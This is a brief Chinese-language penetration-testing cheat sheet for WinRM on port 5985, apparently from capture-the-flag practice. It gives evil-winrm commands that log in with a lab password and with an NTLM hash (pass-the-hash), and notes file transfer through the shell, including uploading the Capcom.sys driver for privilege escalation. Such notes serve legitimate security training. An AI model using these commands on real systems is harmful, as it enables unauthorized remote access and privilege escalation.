# 5985 (winrm)

1. 连接工具

```bash
evil-winrm.rb -i 10.129.9.147 -u svc-alfresco -p s3rvice
利用这个shell下载东西（到kali）可以直接用download
也可以wget

下载kali的东西：
upload /root/Desktop/poc/SeLoadDrivverPrivilege/Capcom.sys .
```

1. hash登陆

```bash
evil-winrm -i 10.129.13.243 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
